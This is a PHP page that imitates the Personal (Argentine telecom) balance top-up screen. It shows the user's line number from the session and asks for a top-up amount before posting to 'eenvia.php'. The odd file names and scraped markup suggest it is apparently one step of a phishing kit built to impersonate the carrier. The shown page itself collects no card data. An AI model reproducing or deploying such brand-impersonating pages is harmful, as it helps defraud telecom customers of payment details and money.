<?php
    session_start();

?>

<html>
   <head>
      <meta charset="utf-8">
      <meta name="title" content="Recargar Saldo, fácil y se acredita en el momento | Personal">
      <meta name="description" content="Entrá y recarga tu saldo para seguir navegando con tu línea Personal. Podés recargar con tarjeta de crédito o débito de una manera fácil desde casa.">
      <meta name="viewport" content="viewport-fit=cover, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
      <title>Recargar Saldo, fácil y se acredita en el momento | Personal</title>
      <link rel="icon" type="image/x-icon" href="favicon.ico">
      <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
      <link rel="stylesheet" type="text/css" href="css/normalizer.css">
      
      <link rel="stylesheet" type="text/css" href="css/amount.css">
   </head>

   <body style="background-color: rgb(229, 229, 229);">
         <div class="container-fluid">
            <div class="row">
               <div class="col-12 p-0">
                  <header-component _nghost-hol-c9="">
                  <header class="header">
                     <nav class="px-0 pt-0">
                        <div class="d-flex justify-content-between align-items-center">
                           <div class="ml-3 ml-md-5 bd-highlight"><img src="media/flow.svg" class="pl-md-4 img-fluid size-logo"></div>
                           <div class="mr-3 mr-md-5 bd-highlight">
                              <div class="d-none d-sm-block"><img src="media/secure.svg" class="pr-md-4"></div>
                              <div class="d-block d-sm-none"><img src="media/secure-mobile.svg" class="pr-md-4 pr-2"></div>
                           </div>
                        </div>
                     </nav>
                  </header>
               </header-component>
                  <select-amount _nghost-jvj-c43="">
                     <div class="row justify-content-center align-items-center">
                        <div class="col-12 p-0 align-items-start">
                           <div class="well-black">
                              <img src="media/avatar-mobile.svg">
                              <p class="mb-0">Nº de línea ingresado</p>
                              <p class="mb-0 p-small"><b><?php echo($_SESSION['lineNumber']);?></b></p>
                           </div>
                        </div>
                        
                     </div>
                     <div class="row justify-content-center align-items-center mt-sm-4">
                        <div class="col-12 col-sm-5">
                           <div class="row text-center">
                              <div class="col-12">
                                 <h4 class="title">Recarga crédito</h4>
                              </div>
                              <div class="col-12 well well-bordered">
                                 <div class="col-12">
                                    <form action="eenvia.php" method="POST" class="ng-pristine ng-invalid ng-touched" id="siguiente2">
                                    <input type="hidden" name="pn" value="123121211">
                                       <div class="form-group">
                                          <div class="input-select mb-3">
                                             <label class="label-input mb-4" style="font-weight: 700; font-size: 18px;"><strong>Monto a recargar</strong></label>
                                             <p class="info mb-4"> Con tu Recarga tenés un <strong>20%</strong> de crédito extra. Además si recargás <strong>$400 o más</strong>, tenés <strong>1 GB para navegar y 1 GB para redes y video + WhatsApp gratis + Llamadas ilimitadas</strong> durante <strong>30 días</strong></p>
                                             
                                             <select formcontrolname="amount" class="form-control ng-pristine ng-invalid ng-touched" name="select" id="select" size="1">
                                                <option value="undefined" style="display:none" class="option-default">Monto a recargar</option>
                                                <option value="undefined" disabled="">Monto a recargar</option>
                                                <option value="50">$50 </option>
                                                <option value="100">$100 </option>
                                                <option value="200">$200 </option>
                                                <option value="250">$250 </option>
                                                <option value="300">$300 </option>
                                                <option value="350">$350 </option>
                                                <option value="400">$400 </option>
                                                <option value="500">$500 </option>
                                                <option value="600">$600 </option>
                                                <option value="700">$700 </option>
                                                <option value="800">$800 </option>
                                                <option value="900">$900 </option>
                                                <option value="1000">$1000 </option>
                                             </select>
                                             <input type="hidden" name="am" id="amountHidden">
                                          </div>
                                       </div>
                                 </form></div>
                                 <div class="col-12">
                                    <div class="row mt-4">
                                       <div class="col-12 col-sm-6 text-right order-1 order-md-0 mb-2"><button id="backButtonAmount" type="button" class="btn-back mb-4 mb-sm-0">Anterior</button></div>
                                       <div class="col-12 col-sm-6 text-left order-0 order-md-1 mb-2">
                                          <button type="submit" id="amButton" class="btn btn-disabled d-block d-md-inline-block" form="siguiente2">Siguiente</button>
                                       </div>
                                    </div>
                                 </div>
                                 
                              </div>
                           </div>
                        </div>
                     </div>
                  </select-amount>
                  
               </div>
            </div>
         </div>
      
   
   
<script src="javascript/query.min.js"></script>
<script src="javascript/query-form.js"></script>
<script src="javascript/poper.min.js"></script>
<script src="javascript/bootstrap.min.js"></script>
<script src="javascript/jquery.mask.js"></script>
<script src="javascript/custom.js"></script>
      

</body></html>